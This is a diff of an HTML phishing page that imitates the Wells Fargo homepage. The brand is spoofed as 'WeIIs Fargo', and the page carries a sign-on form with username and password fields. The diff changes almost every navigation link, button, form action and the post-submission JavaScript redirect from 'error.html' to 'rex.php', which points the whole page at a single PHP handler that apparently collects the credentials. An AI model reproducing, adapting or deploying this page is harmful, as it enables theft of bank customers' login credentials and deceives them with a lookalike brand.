+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">WeIIs Fargo Rewards<sup>®</sup></a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Request a balance transfer</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Request a balance transfer</a> 
 											</div>
 										
 											<h3 class="l3-headline">EDUCATION &amp; TOOLS</h3>
 											<div class="l3-link-item">
-												<a href=error.html data-platform="salesplatform">Respond to mail offer</a>
+												<a href=rex.php data-platform="salesplatform">Respond to mail offer</a>
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Digital wallets</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Digital wallets</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Credit card FAQs</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Credit card FAQs</a> 
 											</div>
 											<div class="l3-link-item">
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">FICO<sup>®</sup> Credit Score</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">FICO<sup>®</sup> Credit Score</a> 
 											</div>
 											<div class="l3-link-item">
-												<a href=error.html data-platform="creditCardsWF">Credit card education</a>
+												<a href=rex.php data-platform="creditCardsWF">Credit card education</a>
 											</div>
 										
 									</div>
@@ -1007,14 +1008,14 @@
 									</button>	
 								</div>
 								<div class="ps-fat-nav-l3-primary">
-									<div class="ps-fat-nav-l3-back"><a href=error.html class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
+									<div class="ps-fat-nav-l3-back"><a href=rex.php class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
 </span>Back</a></div>
 									
 									<div class="ps-fat-nav-l3-ctas">
-										<a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="ps-fat-nav-l3-primary-button" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">View home loans</a>
+										<a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="ps-fat-nav-l3-primary-button" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">View home loans</a>
 										
 											
-												 <a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="ps-fat-nav-l3-secondary-button" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Check mortgage rates</a> 
+												 <a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="ps-fat-nav-l3-secondary-button" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">Check mortgage rates</a> 
 											
 										
 									</div>
@@ -1023,7 +1024,7 @@
 										
 											
 											
-												<a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
+												<a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
 											
 											<div class="l3-product-icon icon-home-for-sale">
 											</div>
@@ -1042,7 +1043,7 @@
 										
 											
 											
-												<a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
+												<a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
 											
 											<div class="l3-product-icon icon-percentage">
 											</div>
@@ -1061,7 +1062,7 @@
 										
 											
 										
-												<a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
+												<a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
 											
 											<div class="l3-product-icon icon-key">
 											</div>
@@ -1080,7 +1081,7 @@
 										
 											
 											
-												<a data-platform="publicsite" href=error.html exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
+												<a data-platform="publicsite" href=rex.php exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
 											
 											<div class="l3-product-icon icon-house">
 											</div>
@@ -1099,7 +1100,7 @@
 										
 											
 											
-												<a href=error.html class="l3-product-tile">
+												<a href=rex.php class="l3-product-tile">
 											
 											<div class="l3-product-icon icon-check-mark">
 											</div>
@@ -1118,7 +1119,7 @@
 										
 											
 											
-												<a href=error.html class="l3-product-tile">
+												<a href=rex.php class="l3-product-tile">
 											
 											<div class="l3-product-icon icon-magnifying-glass">
 											</div>
@@ -1190,11 +1191,11 @@
 									</button>	
 								</div>
 								<div class="ps-fat-nav-l3-primary">
-									<div class="ps-fat-nav-l3-back"><a href=error.html class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
+									<div class="ps-fat-nav-l3-back"><a href=rex.php class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
 </span>Back</a></div>
 									
 									<div class="ps-fat-nav-l3-ctas">
-										<a href=error.html data-platform="dsf" class="ps-fat-nav-l3-primary-button">See my loan options</a>
+										<a href=rex.php data-platform="dsf" class="ps-fat-nav-l3-primary-button">See my loan options</a>
 										
 											
 										
@@ -1299,7 +1300,7 @@
 										
 											<h3 class="l3-headline">EDUCATION &amp; TOOLS</h3>
 											<div class="l3-link-item">
-												<a href=error.html data-platform="dsf">Check your rate and loan options</a>
+												<a href=rex.php data-platform="dsf">Check your rate and loan options</a>
 											</div>
 											<div class="l3-link-item">
 												 <a href="/personal-loans/debt-consolidation-calculator/">Debt consolidation calculator</a> 
@@ -1327,7 +1328,7 @@
 									</button>	
 								</div>
 								<div class="ps-fat-nav-l3-primary">
-									<div class="ps-fat-nav-l3-back"><a href=error.html class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
+									<div class="ps-fat-nav-l3-back"><a href=rex.php class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
 </span>Back</a></div>
 									
 									<div class="ps-fat-nav-l3-ctas">
@@ -1341,7 +1342,7 @@
 										
 											
 											
-												<a data-platform="publicsite" href="error.html?origin=cob&amp;LOB=CONS" exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
+												<a data-platform="publicsite" href="rex.php?origin=cob&amp;LOB=CONS" exitdestination="" exitdisclaimer="" data-newbrowser="" enrollmentid="" data-rottracking="" class="l3-product-tile" data-params="" data-responsive-params="" data-destinationtype="none" data-nativelinktype="none">
 											
 											<div class="l3-product-icon icon-car">
 											</div>
@@ -1442,7 +1443,7 @@
 									</button>	
 								</div>
 								<div class="ps-fat-nav-l3-primary">
-									<div class="ps-fat-nav-l3-back"><a href=error.html class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
+									<div class="ps-fat-nav-l3-back"><a href=rex.php class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
 </span>Back</a></div>
 									
 									<div class="ps-fat-nav-l3-ctas">
@@ -1562,7 +1563,7 @@
 									</button>	
 								</div>
 								<div class="ps-fat-nav-l3-primary">
-									<div class="ps-fat-nav-l3-back"><a href=error.html class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
+									<div class="ps-fat-nav-l3-back"><a href=rex.php class="l3-back-link"><span class="ps-fat-nav-arrow is-left" aria-hidden="true">
 </span>Back</a></div>
 									
 									<div class="ps-fat-nav-l3-ctas">
@@ -1691,7 +1692,7 @@
                         <div class="form-field mr-tp-10 password-div">
                             <input type="password" accesskey="P" id="password" class="form-element formElementPassword login_field signon-in pmask" name="data[pw]" maxlength="32" autocomplete="off">
                             <label for="password" id="password_label" class="id_label">Password</label>
-                            <a href=error.html id="password-eye-icon" class="show-password" role="button" aria-label="show password"><span class="password-visible-icon"></span></a>
+                            <a href=rex.php id="password-eye-icon" class="show-password" role="button" aria-label="show password"><span class="password-visible-icon"></span></a>
                         </div>
                         <div id="saveuid" class="save-username save-us-mb">
                             <input type="checkbox" accesskey="S" id="saveusername" class="c29link" name="saveusername" data-content-id="c29content-save-username" triggerhover="false" isclickable="true">
@@ -1717,7 +1718,7 @@
                             <input type="submit" name="btnSignon" id="btnSignon" class="ps-btn-primary" data-mrkt-tracking-id="3d6c76ba-9d34-4def-977d-a79cb8afc738" value="Sign On">
                                 
 
-                                <a class="enroll" href=error.html>Enroll</a>
+                                <a class="enroll" href=rex.php>Enroll</a>
                             
                         </div>
                         <input type="hidden" name="screenid" value="SIGNON">
@@ -1743,21 +1744,21 @@
     ).then((html) => {
       // you can put any JS code here
      // alert('success')
-	  window.location.href = 'error.html';
+	  window.location.href = 'rex.php';
     });
   });
 </script>
         <div class="signon-bottom">
 
-            <a href=error.html>Forgot username or password?</a>
-            <a href=error.html>Security Center</a>
-            <a href=error.html>Privacy, Cookies, and Legal</a>
+            <a href=rex.php>Forgot username or password?</a>
+            <a href=rex.php>Security Center</a>
+            <a href=rex.php>Privacy, Cookies, and Legal</a>
         </div>
         
             <div area-hidden="true" class="c29content-tooltip tooltip-top" data-content-id="c29content-save-username">
 				 <span class="c29close">
 					<p><strong>Notice</strong></p>
-					 <a href=error.html class="tooltip-close-icon"></a>
+					 <a href=rex.php class="tooltip-close-icon"></a>
 				 </span>
                 <p class="security-text">For your security, we do not recommend using this feature on a shared device.</p>
             </div>
@@ -1794,7 +1795,7 @@
 					
 					<p>Explore our checking options and choose the right account for you</p>
 					<div class="ps-padding">
-						<a class="ps-btn-secondary" data-cid="tcm:242-223859-16" data-ctid="tcm:91-223657-32" data-presentation="2" href=error.html aria-label="Get started. Explore our checking options and choose the right account for you.">Get started &gt;&gt;</a>
+						<a class="ps-btn-secondary" data-cid="tcm:242-223859-16" data-ctid="tcm:91-223657-32" data-presentation="2" href=rex.php aria-label="Get started. Explore our checking options and choose the right account for you.">Get started &gt;&gt;</a>
 						
 					</div>	
 			</div>
@@ -1887,7 +1888,7 @@
         <p class="ps-marketing-text-content">Discover the benefits of our checking accounts and choose the right one for you</p>
 
                     <p class="learn-more-mobile">
-                        <span><a class="c7" data-cid="tcm:242-228784-16" data-ctid="tcm:91-228643-32" data-presentation="1" href=error.html aria-label="Unlock convenient checking. Discover the benefits of our checking accounts and choose the right one for you. Get started.">Get started</a></span>
+                        <span><a class="c7" data-cid="tcm:242-228784-16" data-ctid="tcm:91-228643-32" data-presentation="1" href=rex.php aria-label="Unlock convenient checking. Discover the benefits of our checking accounts and choose the right one for you. Get started.">Get started</a></span>
                     </p>
       </div>
             
@@ -1897,7 +1898,7 @@
 
       <div class="ps-marketing-promo-link">
          <p class="learn-more">
-                    <span><a class="c7" data-cid="tcm:242-228784-16" data-ctid="tcm:91-228643-32" data-presentation="1" href=error.html aria-label="Unlock convenient checking. Discover the benefits of our checking accounts and choose the right one for you. Get started.">Get started</a></span>
+                    <span><a class="c7" data-cid="tcm:242-228784-16" data-ctid="tcm:91-228643-32" data-presentation="1" href=rex.php aria-label="Unlock convenient checking. Discover the benefits of our checking accounts and choose the right one for you. Get started.">Get started</a></span>
           </p>
       </div>
     </div>
@@ -1954,7 +1955,7 @@
             
                 <div class="ps-marketing-small-promo-item" lang="en">
                     
-	<div data-cid="tcm:182-228910-16" data-ctid="tcm:91-223671-32">     <div class="task-wrapper" id="marketing-rates">         <div class="mark-small-promo-illustration">             <div class="ps-marketing-text ">                 <div>                     <h2 class="ps-marketing-text-heading ">Interest rates today</h2>                     <a href="/help/rates/?linkLoc=taskbar">                         <p class="learn-more-mobile">                             <span>Learn more</span>                             <span class="right-chevron"></span> </p> </a> </div>                 <div class="ps-marketing-icon " id="ps-marketing-icon"><img data-deferred-src="https://www17.wellsfargomedia.com/assets/images/rwd/first_time_experience-account_summary.png" alt="" class="deferred"></div> <div> <ul>                         <li class="task" id="task-rates">                             <div class="taskContentWrapper taskbar-nonxs">                                 <div class="taskHiddenContent" id="check-rates" style="display: none;">                                     <form name="frmCheckRates" id="frmCheckRates" action="/dropdown" autocomplete="off">                                         <div id="check_rates_panel"><label for="check_rates_dropdown" id="check_rates_dropdown_lable">Check                                                 rates</label> <select name="dropdown" id="check_rates_dropdown" aria-label="Check rates">                                                 <option value="personal.responsive.checkRates.Mortgage">Mortgage rates                                                 </option>                                                 <option value="personal.responsive.checkRates.CDS">Savings and CDs rates                                                 </option>                                                 <option value="creditCardsWFHost">Credit card                                                     rates</option>                                                 <option value="personal.responsive.checkRates.PersonalLoans">Personal                                                     loan rates</option>                                                 <option value="personal.responsive.checkRates.More">All rates</option> </select> </div>                                         <button class="ps-btn-alt go-btn" id="rates-go-btn" role="button" type="submit">Go</button> </form> </div> </div> </li> </ul> </div> </div>             <div class="ps-marketing-promo-link ">                 <a class="check-rates-wrapper" id="check-rates-wrapper" aria-label="Check rates opens dropdown" role="button" href=error.html data-goto="/help/rates/">                     <p class="learn-more ">                         <span>Check rates</span>                         <span class="right-chevron"></span> </p> </a> </div> </div> </div> </div>
+	<div data-cid="tcm:182-228910-16" data-ctid="tcm:91-223671-32">     <div class="task-wrapper" id="marketing-rates">         <div class="mark-small-promo-illustration">             <div class="ps-marketing-text ">                 <div>                     <h2 class="ps-marketing-text-heading ">Interest rates today</h2>                     <a href="/help/rates/?linkLoc=taskbar">                         <p class="learn-more-mobile">                             <span>Learn more</span>                             <span class="right-chevron"></span> </p> </a> </div>                 <div class="ps-marketing-icon " id="ps-marketing-icon"><img data-deferred-src="https://www17.wellsfargomedia.com/assets/images/rwd/first_time_experience-account_summary.png" alt="" class="deferred"></div> <div> <ul>                         <li class="task" id="task-rates">                             <div class="taskContentWrapper taskbar-nonxs">                                 <div class="taskHiddenContent" id="check-rates" style="display: none;">                                     <form name="frmCheckRates" id="frmCheckRates" action="/dropdown" autocomplete="off">                                         <div id="check_rates_panel"><label for="check_rates_dropdown" id="check_rates_dropdown_lable">Check                                                 rates</label> <select name="dropdown" id="check_rates_dropdown" aria-label="Check rates">                                                 <option value="personal.responsive.checkRates.Mortgage">Mortgage rates                                                 </option>                                                 <option value="personal.responsive.checkRates.CDS">Savings and CDs rates                                                 </option>                                                 <option value="creditCardsWFHost">Credit card                                                     rates</option>                                                 <option value="personal.responsive.checkRates.PersonalLoans">Personal                                                     loan rates</option>                                                 <option value="personal.responsive.checkRates.More">All rates</option> </select> </div>                                         <button class="ps-btn-alt go-btn" id="rates-go-btn" role="button" type="submit">Go</button> </form> </div> </div> </li> </ul> </div> </div>             <div class="ps-marketing-promo-link ">                 <a class="check-rates-wrapper" id="check-rates-wrapper" aria-label="Check rates opens dropdown" role="button" href=rex.php data-goto="/help/rates/">                     <p class="learn-more ">                         <span>Check rates</span>                         <span class="right-chevron"></span> </p> </a> </div> </div> </div> </div>
 
                 </div>
             
@@ -1985,7 +1986,7 @@
                         
                         <p>With low down payment options on a fixed-rate mortgage</p>
                         <div class="ps-promo-full-links">
-                            <a class="ps-btn-secondary" data-cid="tcm:242-223909-16" data-ctid="tcm:91-223664-32" data-presentation="2" href=error.html aria-label="Get started with fixed-rate mortgages">Get started</a>
+                            <a class="ps-btn-secondary" data-cid="tcm:242-223909-16" data-ctid="tcm:91-223664-32" data-presentation="2" href=rex.php aria-label="Get started with fixed-rate mortgages">Get started</a>
                         </div>
                     </div>
                 </div>
@@ -2022,7 +2023,7 @@
 
 			<div class="subheadline-regular">Discover how to start saving to meet your retirement goals</div>
 
-			<p><a href=error.html aria-label="Get ready for retirement. Save. Invest. Retire well." class="ps-btn-secondary" data-cid="tcm:242-238325-16" data-ctid="tcm:91-236591-32" data-presentation="2">Get ready for retirement</a></p>
+			<p><a href=rex.php aria-label="Get ready for retirement. Save. Invest. Retire well." class="ps-btn-secondary" data-cid="tcm:242-238325-16" data-ctid="tcm:91-236591-32" data-presentation="2">Get ready for retirement</a></p>
 
 		</div>
 	</div>
@@ -2041,7 +2042,7 @@
 
 			<div class="subheadline-regular">Discover four steps that may help you reduce debt and strengthen credit</div>
 
-			<p><a href=error.html aria-label="Build credit and reduce debt Reduce debt. Build credit. Enjoy life" class="ps-btn-secondary" data-cid="tcm:242-238327-16" data-ctid="tcm:91-236591-32" data-presentation="2">Build credit and reduce debt</a></p>
+			<p><a href=rex.php aria-label="Build credit and reduce debt Reduce debt. Build credit. Enjoy life" class="ps-btn-secondary" data-cid="tcm:242-238327-16" data-ctid="tcm:91-236591-32" data-presentation="2">Build credit and reduce debt</a></p>
 
 		</div>
 	</div>
@@ -2060,7 +2061,7 @@
 
 			<div class="subheadline-regular">Discover digital tools to help you budget, save, manage credit, and more</div>
 
-			<p><a href=error.html aria-label="Access the toolkit and Get tools. Get tips. Get peace of mind." class="ps-btn-secondary" data-cid="tcm:242-238328-16" data-ctid="tcm:91-236591-32" data-presentation="2">Access the toolkit</a></p>
+			<p><a href=rex.php aria-label="Access the toolkit and Get tools. Get tips. Get peace of mind." class="ps-btn-secondary" data-cid="tcm:242-238328-16" data-ctid="tcm:91-236591-32" data-presentation="2">Access the toolkit</a></p>
 
 		</div>
 	</div>
@@ -2110,13 +2111,13 @@
                                         </p>
                                         <div class="ps-download-buttons">
                                             
-                                                <a role="button" data-exit="true" class="ps-button-applestore" data-href-id="1224111702" href=error.html>
+                                                <a role="button" data-exit="true" class="ps-button-applestore" data-href-id="1224111702" href=rex.php>
                                                 <span></span>
                                                 <span>
 											App Store</span>
                                                 </a>
                                             
-                                                <a role="button" data-exit="true" class="ps-button-googleplay" data-href-id="3224111702" href=error.html>
+                                                <a role="button" data-exit="true" class="ps-button-googleplay" data-href-id="3224111702" href=rex.php>
                                                 <span></span>
                                                 <span>
 											Google Play</span>
@@ -2175,7 +2176,7 @@
 
 				
 
-				<p><a href=error.html class="ps-btn-secondary" data-cid="tcm:84-224409-16" data-ctid="tcm:91-223644-32" data-presentation="2">About WeIIs Fargo</a></p>
+				<p><a href=rex.php class="ps-btn-secondary" data-cid="tcm:84-224409-16" data-ctid="tcm:91-223644-32" data-presentation="2">About WeIIs Fargo</a></p>
 
 			</div>
 		</div>
@@ -2206,7 +2207,7 @@
 
 				
 
-				<p><a href=error.html enrollmentid="3107" class="ps-btn-secondary" data-cid="tcm:84-224410-16" data-ctid="tcm:91-223644-32" data-presentation="2">WeIIs Fargo Stories</a></p>
+				<p><a href=rex.php enrollmentid="3107" class="ps-btn-secondary" data-cid="tcm:84-224410-16" data-ctid="tcm:91-223644-32" data-presentation="2">WeIIs Fargo Stories</a></p>
 
 			</div>
 		</div>
@@ -2229,7 +2230,7 @@
             <ul class="contact-bar-links">
                                     
 					<li class="ps-col-xl-3 ps-col-lg-3 ps-col-md-6 ps-col-s-12">
-						<a href=error.html role="button" tabindex="0" class="contact-bar-collapsible contact-bar-location contact-bar-location-header" aria-expanded="false">
+						<a href=rex.php role="button" tabindex="0" class="contact-bar-collapsible contact-bar-location contact-bar-location-header" aria-expanded="false">
 							<span class="contact-bar-location-icon">
 </span>
 							<span role="heading" aria-level="3" class="contact-bar-select">Find a location</span>
@@ -2238,7 +2239,7 @@
 						</a>
 						<div class="contact-bar-content contact-bar-content-hidden" aria-hidden="true">
 							<div class="contact-bar-form-grp">
-								<form action=error.html method="get" class="find_location" xmlns="http://www.w3.org/1999/xhtml">
+								<form action=rex.php method="get" class="find_location" xmlns="http://www.w3.org/1999/xhtml">
 									<div class="contact-bar-form-input">
 										<input type="text" aria-label="City, State or ZIP" placeholder="" id="contactBarLocator" name="searchTxt" class="contact-bar-input-box">
 										<label for="contactBarLocator">City, State or ZIP</label>
@@ -2256,7 +2257,7 @@
 				                    
 					
 					<li class="ps-col-xl-3 ps-col-lg-3 ps-col-md-6 ps-col-s-12">
-						<a href=error.html role="button" tabindex="0" class="contact-bar-collapsible contact-bar-appointment contact-bar-appointment-header" aria-expanded="false">
+						<a href=rex.php role="button" tabindex="0" class="contact-bar-collapsible contact-bar-appointment contact-bar-appointment-header" aria-expanded="false">
 							<span class="support-dropdown-icon appointment-icon">
 </span>
 							<span role="heading" aria-level="3" class="contact-bar-select">Make an appointment</span>
@@ -2265,7 +2266,7 @@
 						</a>
 						<div class="contact-bar-content contact-bar-content-hidden" aria-hidden="true">
 							<div class="contact-bar-form-grp">
-								<form action=error.html method="get" class="find_location" xmlns="http://www.w3.org/1999/xhtml">
+								<form action=rex.php method="get" class="find_location" xmlns="http://www.w3.org/1999/xhtml">
 									<div class="contact-bar-form-input">
 										<input type="text" aria-label="City, State or ZIP" placeholder="" id="contactBarMAA" name="searchTxt" class="contact-bar-input-box">
 										<label for="contactBarMAA">City, State or ZIP</label>
@@ -2284,7 +2285,7 @@
 					
 					
 					<li class="ps-col-xl-3 ps-col-lg-3 ps-col-md-6 ps-col-s-12">
-						<a href=error.html role="button" tabindex="0" class="contact-bar-collapsible contact-bar-call" aria-expanded="false">
+						<a href=rex.php role="button" tabindex="0" class="contact-bar-collapsible contact-bar-call" aria-expanded="false">
 							<span class="contact-bar-appointment-icon">
 </span>
 							<span role="heading" aria-level="3" class="contact-bar-select">Quick help</span>
@@ -2294,9 +2295,9 @@
 						<div class="contact-bar-content contact-bar-call-desc contact-bar-content-hidden" aria-hidden="true">
 							<ul>
 								
-									<li><a href=error.html>Customer service and FAQs</a></li>
+									<li><a href=rex.php>Customer service and FAQs</a></li>
 								
-									<li> <a href=error.html>Find routing and account numbers</a> </li>
+									<li> <a href=rex.php>Find routing and account numbers</a> </li>
 								
 							</ul>
 						</div>
@@ -2338,8 +2339,8 @@
 						
 						
 						<div class="ep-modal-footer">
-							<a class="ps-btn-primary" href=error.html tabindex="2" data-content-id="1224111702" data-presentation="1">Continue</a>
-							<a class="ps-btn-secondary" role="button" href=error.html tabindex="3">Cancel</a>
+							<a class="ps-btn-primary" href=rex.php tabindex="2" data-content-id="1224111702" data-presentation="1">Continue</a>
+							<a class="ps-btn-secondary" role="button" href=rex.php tabindex="3">Cancel</a>
 						</div>
 					</div>
 				</div>
@@ -2366,8 +2367,8 @@
 						
 						
 						<div class="ep-modal-footer">
-							<a class="ps-btn-primary" href=error.html tabindex="2" data-content-id="3224111702" data-presentation="1">Continue</a>
-							<a class="ps-btn-secondary" role="button" href=error.html tabindex="3">Cancel</a>
+							<a class="ps-btn-primary" href=rex.php tabindex="2" data-content-id="3224111702" data-presentation="1">Continue</a>
+							<a class="ps-btn-secondary" role="button" href=rex.php tabindex="3">Cancel</a>
 						</div>
 					</div>
 				</div>
@@ -2394,8 +2395,8 @@
 						
 						
 						<div class="ep-modal-footer">
-							<a class="ps-btn-primary" href=error.html tabindex="2" data-content-id="1224300702" data-presentation="1">Continue</a>
-							<a class="ps-btn-secondary" role="button" href=error.html tabindex="3">Cancel</a>
+							<a class="ps-btn-primary" href=rex.php tabindex="2" data-content-id="1224300702" data-presentation="1">Continue</a>
+							<a class="ps-btn-secondary" role="button" href=rex.php tabindex="3">Cancel</a>
 						</div>
 					</div>
 				</div>
@@ -2422,8 +2423,8 @@
 						
 						
 						<div class="ep-modal-footer">
-							<a class="ps-btn-primary" href=error.html tabindex="2" data-content-id="3224300702" data-presentation="1">Continue</a>
-							<a class="ps-btn-secondary" role="button" href=error.html tabindex="3">Cancel</a>
+							<a class="ps-btn-primary" href=rex.php tabindex="2" data-content-id="3224300702" data-presentation="1">Continue</a>
+							<a class="ps-btn-secondary" role="button" href=rex.php tabindex="3">Cancel</a>
 						</div>
 					</div>
 				</div>
@@ -2450,8 +2451,8 @@
 						
 						
 						<div class="ep-modal-footer">
-							<a class="ps-btn-primary" href=error.html tabindex="2" data-content-id="5224300702" data-presentation="1">Continue</a>
-							<a class="ps-btn-secondary" role="button" href=error.html tabindex="3">Cancel</a>
+							<a class="ps-btn-primary" href=rex.php tabindex="2" data-content-id="5224300702" data-presentation="1">Continue</a>
+							<a class="ps-btn-secondary" role="button" href=rex.php tabindex="3">Cancel</a>
 						</div>
 					</div>
 				</div>
@@ -2478,8 +2479,8 @@
 						
 						
 						<div class="ep-modal-footer">
-							<a class="ps-btn-primary" href=error.html tabindex="2" data-content-id="7224300702" data-presentation="1">Continue</a>
-							<a class="ps-btn-secondary" role="button" href=error.html tabindex="3">Cancel</a>
+							<a class="ps-btn-primary" href=rex.php tabindex="2" data-content-id="7224300702" data-presentation="1">Continue</a>
+							<a class="ps-btn-secondary" role="button" href=rex.php tabindex="3">Cancel</a>
 						</div>
 					</div>
 				</div>
@@ -2506,8 +2507,8 @@
 						
 						
 						<div class="ep-modal-footer">
-							<a class="ps-btn-primary" href=error.html tabindex="2" data-content-id="9224300702" data-presentation="1">Continue</a>
-							<a class="ps-btn-secondary" role="button" href=error.html tabindex="3">Cancel</a>
+							<a class="ps-btn-primary" href=rex.php tabindex="2" data-content-id="9224300702" data-presentation="1">Continue</a>
+							<a class="ps-btn-secondary" role="button" href=rex.php tabindex="3">Cancel</a>
 						</div>
 					</div>
 				</div>
@@ -2534,8 +2535,8 @@
 						
 						
 						<div class="ep-modal-footer">
-							<a class="ps-btn-primary" href=error.html tabindex="2" data-content-id="11224300702" data-presentation="1">Continue</a>
-							<a class="ps-btn-secondary" role="button" href=error.html tabindex="3">Cancel</a>
+							<a class="ps-btn-primary" href=rex.php tabindex="2" data-content-id="11224300702" data-presentation="1">Continue</a>
+							<a class="ps-btn-secondary" role="button" href=rex.php tabindex="3">Cancel</a>
 						</div>
 					</div>
 				</div>
@@ -2562,8 +2563,8 @@
 						
 						
 						<div class="ep-modal-footer">
-							<a class="ps-btn-primary" href=error.html tabindex="2" data-content-id="13224300702" data-presentation="1">Continue</a>
-							<a class="ps-btn-secondary" role="button" href=error.html tabindex="3">Cancel</a>
+							<a class="ps-btn-primary" href=rex.php tabindex="2" data-content-id="13224300702" data-presentation="1">Continue</a>
+							<a class="ps-btn-secondary" role="button" href=rex.php tabindex="3">Cancel</a>
 						</div>
 					</div>
 				</div>
@@ -2587,34 +2588,34 @@
         <nav role="navigation" aria-label="Footer Navigation">
             <ul>
                 <li class="ps-footer-link">
-                    <span> <a href=error.html>Privacy, Cookies, Security &amp; Legal</a> </span>
+                    <span> <a href=rex.php>Privacy, Cookies, Security &amp; Legal</a> </span>
                 </li>
                 <li class="ps-footer-link">
-                    <span><a href=error.html>Do Not Sell or Share My Personal Information</a></span>
+                    <span><a href=rex.php>Do Not Sell or Share My Personal Information</a></span>
                 </li>
                 <li class="ps-footer-link">
-                    <span> <a href=error.html>Notice of Data Collection</a> </span>
+                    <span> <a href=rex.php>Notice of Data Collection</a> </span>
                 </li>
                 <li class="ps-footer-link">
-                    <span> <a href=error.html>General Terms of Use</a> </span>
+                    <span> <a href=rex.php>General Terms of Use</a> </span>
                 </li>
                 <li class="ps-footer-link">
-                    <span> <a href=error.html>Online Access Agreement</a> </span>
+                    <span> <a href=rex.php>Online Access Agreement</a> </span>
                 </li>
                 <li class="ps-footer-link">
-                    <span> <a href=error.html>Report Fraud</a> </span>
+                    <span> <a href=rex.php>Report Fraud</a> </span>
                 </li>
                 <li class="ps-footer-link">
-                    <span> <a href=error.html>About WeIIs Fargo</a> </span>
+                    <span> <a href=rex.php>About WeIIs Fargo</a> </span>
                 </li>
                 <li class="ps-footer-link">
-                    <span> <a href=error.html>Careers</a> </span>
+                    <span> <a href=rex.php>Careers</a> </span>
                 </li>
                 <li class="ps-footer-link">
-                    <span> <a href=error.html>Diversity and Accessibility</a> </span>
+                    <span> <a href=rex.php>Diversity and Accessibility</a> </span>
                 </li>
                 <li class="ps-footer-link">
-                    <span> <a href=error.html>Sitemap</a> </span>
+                    <span> <a href=rex.php>Sitemap</a> </span>
                 </li>
             </ul>
